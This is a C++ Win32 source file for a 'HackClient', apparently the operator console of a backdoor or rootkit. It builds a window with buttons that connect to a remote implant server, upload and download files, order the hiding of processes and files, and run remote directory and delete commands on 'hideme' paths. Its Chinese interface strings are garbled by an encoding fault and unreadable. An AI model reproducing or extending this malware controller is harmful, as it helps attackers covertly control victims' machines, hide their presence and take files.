#include"HACK_CLIENT.h"
//#include <windows.h>
#include<Shlobj.h>
#include<string.h>
//#pragma comment(lib,"Shlobj.lib")
#pragma warning( disable : 4091 )
void HackClient::Init(HWND hwnd){

	int button_x = BUTTON_X;
	int button_y = BUTTON_Y;

	//��ʼ������

	//��һ��
	hwndbutton[BUTTON_CLIENT_LINK] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_CLIENT_LINK],"���ӷ�����");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_FILE_UPLOAD] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_FILE_UPLOAD],"�ϴ��ļ�");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_FILE_DOWNLOAD] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,		
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_FILE_DOWNLOAD],"�����ļ�");

	hwndbutton[BUTTON_SHELL_WINDOW]=CreateWindow("EDIT",NULL,WS_CHILD|WS_BORDER|WS_VISIBLE|ES_LEFT|ES_MULTILINE|ES_READONLY,
		SHELL_X,SHELL_Y,SHELL_WIDTH,SHELL_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),NULL); 
	SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"����SHELL��ʾ����");

	
	//�ڶ���
	button_x += BUTTON_DISTANCE+BUTTON_WIDTH;
	button_y = BUTTON_Y;

	hwndbutton[BUTTON_PROCESS_HIDE] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_PROCESS_HIDE],"��������");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_FILE_HIDE] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_FILE_HIDE],"�ļ�����");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_SHELL_INPUT]=CreateWindow("EDIT",NULL,WS_CHILD|WS_BORDER|WS_VISIBLE|ES_LEFT|ES_MULTILINE,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),NULL); 
	SetWindowText(hwndbutton[BUTTON_SHELL_INPUT],"SHELL���봰��");


	//������
	button_x += BUTTON_DISTANCE+BUTTON_WIDTH;
	button_y = BUTTON_Y;

	hwndbutton[BUTTON_SHELL_LS] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_SHELL_LS],"LS");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_SHELL_MKDIR] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_SHELL_MKDIR],"MKDIR");

	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_SHELL_RMDIR] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_SHELL_RMDIR],"RMDIR");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	/*hwndbutton[BUTTON_SHELL_RM] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_SHELL_RM],"RM");*/

    MoveWindow(hwnd,SCREEN_X,SCREEN_Y,SCREEN_WIDTH,SCREEN_HEIGHT,TRUE);

}


void HackClient::ScreenPaint(HWND hwnd){        //�������汳��
	
	PAINTSTRUCT ps;
	HDC hdc= BeginPaint(hwnd, &ps);
	HDC hdcMem = CreateCompatibleDC(hdc);  
	const char* lpszName = "rc2.bmp";
	HBITMAP hBitmap = (HBITMAP)::LoadImage(
		NULL,
		lpszName,
		IMAGE_BITMAP,
		0,
		0,
		LR_LOADFROMFILE);
    BITMAP bm;
    SelectObject(hdcMem,hBitmap);
    GetObject(hBitmap, sizeof(bm), &bm);
    BitBlt(hdc, 0, 0, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);
    DeleteDC(hdcMem);
    EndPaint(hwnd, &ps);

}


void HackClient::CommandExecute(HWND hwnd,int dir){ 
	switch(dir)
	{
	case BUTTON_CLIENT_LINK:
		//��ʼ��socket
		mc = new MLHT_CLIENT("127.0.0.1",9000);
		//mc = new MLHT_CLIENT("1.1.1.4",9000);
		//����socket�����
		if(mc->ConnectServer())
			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"LINK SERVER SUCCESSFUL.");
		else
			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"LINK SERVER FAIL.");
		break;
	case BUTTON_FILE_UPLOAD:
		{
			TCHAR str[MAX_PATH] = {0};

			TCHAR uploadFilename[MAX_PATH] = {0};
			OPENFILENAME ofn= {0};
			ofn.lStructSize = sizeof(ofn);
			ofn.hwndOwner = hwnd;
			//ofn.lpstrFilter = "Exe�ļ�(*.exe)\0*.exe\0�����ļ�(*.*)\0*.*\0";//Ҫѡ����ļ���׺
			ofn.lpstrFilter = 
				"�����ļ�(*.*)";//Ҫѡ����ļ���׺
			ofn.lpstrInitialDir = "c:\\users";//Ĭ�ϵ��ļ�·��
			ofn.lpstrFile = uploadFilename;//����ļ��Ļ�����
			ofn.nMaxFile = sizeof(uploadFilename)/sizeof(*uploadFilename);
			ofn.nFilterIndex = 0;
			ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_EXPLORER ;//��־����Ƕ�ѡҪ����OFN_ALLOWMULTISELECT

			if(GetOpenFileName(&ofn)){
				//if(mc->UpLoadFile(uploadFilename,GetFilename(uploadFilename))==PACKET_ACCEPT_SUCCESS){
				if(mc->UpLoadFile(uploadFilename,"d:\\hideme\\test.txt")==PACKET_ACCEPT_SUCCESS){
					wsprintf(str,"�ϴ��ļ�·����%s",uploadFilename);
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"�ϴ�ʧ��");
			}

		}
		break;
	case BUTTON_FILE_DOWNLOAD:
		{
			TCHAR str[MAX_PATH] = {0};

			TCHAR downloadFilename[MAX_PATH] = "d:\\hideme\\test.txt";

			TCHAR downloadFileDir[MAX_PATH] = {0};
			BROWSEINFO bi;
			ZeroMemory(&bi,sizeof(BROWSEINFO)); 
			bi.hwndOwner = NULL; 
			bi.pszDisplayName = downloadFileDir; 
			bi.lpszTitle = "������ѡ�����ص��ļ����ļ���:"; 
			bi.ulFlags = BIF_RETURNFSANCESTORS;
			LPITEMIDLIST idl = SHBrowseForFolder(&bi); 
			if (idl != NULL)
			{ 
				//ѡ�����ص��ļ����ļ���
				if(SHGetPathFromIDList(idl,downloadFileDir))
				{
					strcat_s(downloadFileDir,"\\");
					strcat_s(downloadFileDir,GetFilename(downloadFilename));
					if(mc->DownLoadFile(downloadFilename,downloadFileDir)==PACKET_ACCEPT_SUCCESS){
						wsprintf(str,"�´��ļ� %s \r\n����%s",downloadFilename,downloadFileDir);
						SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
					}
					else
						SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"����ʧ��");
				}
			}
		}
		break;
	case BUTTON_PROCESS_HIDE:
		if(processhide){
			processhide = false;
			mc->ShowProcess();
			SetWindowText(hwndbutton[BUTTON_PROCESS_HIDE],"��������");
			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"�ѷ���������ʾָ��");
		}
		else{
			processhide = true;
			mc->HideProcess();
			SetWindowText(hwndbutton[BUTTON_PROCESS_HIDE],"������ʾ");
			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"�ѷ�����������ָ��");
		}
		break;
	case BUTTON_FILE_HIDE:
		if(filehide){
			filehide = false;
			mc->ShowFile();
			SetWindowText(hwndbutton[BUTTON_FILE_HIDE],"�ļ�����");
			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"�ѷ����ļ���ʾָ��");
		}
		else{
			filehide = true;
			mc->HideFile();
			SetWindowText(hwndbutton[BUTTON_FILE_HIDE],"�ļ���ʾ");
			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"�ѷ����ļ�����ָ��");
		}
		break;
	case BUTTON_SHELL_INPUT:
		{
			TCHAR str[3000] = {0};
			//char a[MAX_PATH]={0};



			TCHAR filedir[MAX_PATH] = "C:\\hideme";
			if(mc->ShellLs(filedir)==PACKET_ACCEPT_SUCCESS){
				//wsprintf(str,"%s�ļ�Ŀ¼Ϊ��\r\n%s",filedir,mc->p_get->GetPacketContent());
				wsprintf(str,"%s",mc->p_get->GetPacketContent());
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
			}
			break;
		}
	case BUTTON_SHELL_LS:
		{
			TCHAR str[3000] = {0};
			//char a[MAX_PATH]={0};



			TCHAR filedir[MAX_PATH] = "C:\\hideme";
			if(mc->ShellLs(filedir)==PACKET_ACCEPT_SUCCESS){
				//wsprintf(str,"%s�ļ�Ŀ¼Ϊ��\r\n%s",filedir,mc->p_get->GetPacketContent());
				wsprintf(str,"%s",mc->p_get->GetPacketContent());
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
			}
			else
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"��Ŀ¼ʧ��");
		}
		break;
	case BUTTON_SHELL_MKDIR:
		{
			TCHAR str[MAX_PATH] = {0};

			TCHAR filedir[MAX_PATH] = "c:\\hideme\\deleteme";
			if(mc->ShellMkdir(filedir)==PACKET_ACCEPT_SUCCESS){
				wsprintf(str,"�Ѵ����ļ�Ŀ¼��\r\n%s",filedir);
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
			}
			else
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"�����ļ�Ŀ¼ʧ��");
		}
		break;
	case BUTTON_SHELL_RMDIR:
		{
			TCHAR str[10000] = {0};

			TCHAR filedir[MAX_PATH] = "d:\\hideme\\deleteme";
			if(mc->ShellRmdir(filedir)==PACKET_ACCEPT_SUCCESS){
				wsprintf(str,"��ɾ���ļ�Ŀ¼��\r\n%s",filedir);
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
			}
			else
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"ɾ���ļ�Ŀ¼ʧ��");
		}
		break;
	case BUTTON_SHELL_RM:
		{
			TCHAR str[MAX_PATH] = {0};

			TCHAR filename[MAX_PATH] = "C:\\hideme\\1.txt";
			if(mc->ShellRm(filename)==PACKET_ACCEPT_SUCCESS){
				wsprintf(str,"��ɾ���ļ���\r\n%s",filename);
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
			}
			else
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"ɾ���ļ�ʧ��");
		}
		break;
	default:
		break;
	}
}


char* HackClient::GetFilename(char* FullPathName)	//��ȡȫ·���е��ļ���
{
	char* pos = FullPathName+strlen(FullPathName);
	while(*pos != '\\'&& pos!=FullPathName)
		pos--;
	if(pos == FullPathName)
		return pos;
	else
		return pos+1;
}